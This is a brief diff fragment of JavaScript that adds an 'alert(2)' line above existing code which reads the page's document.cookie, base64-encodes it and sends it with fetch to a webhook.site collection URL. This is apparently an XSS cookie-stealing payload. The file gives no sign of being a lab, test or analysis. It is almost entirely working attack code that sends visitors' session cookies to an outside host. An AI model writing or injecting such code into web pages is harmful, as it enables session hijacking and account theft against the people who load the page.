@@ -1,3 +1,4 @@
+alert(2);
 var cookie = document.cookie;
 fetch("https://webhook.site/8bfc556c-6584-4e6e-8a23-980d42dc97c0?"+window.btoa(cookie));
 document.addEventListener("DOMContentLoaded", function () {
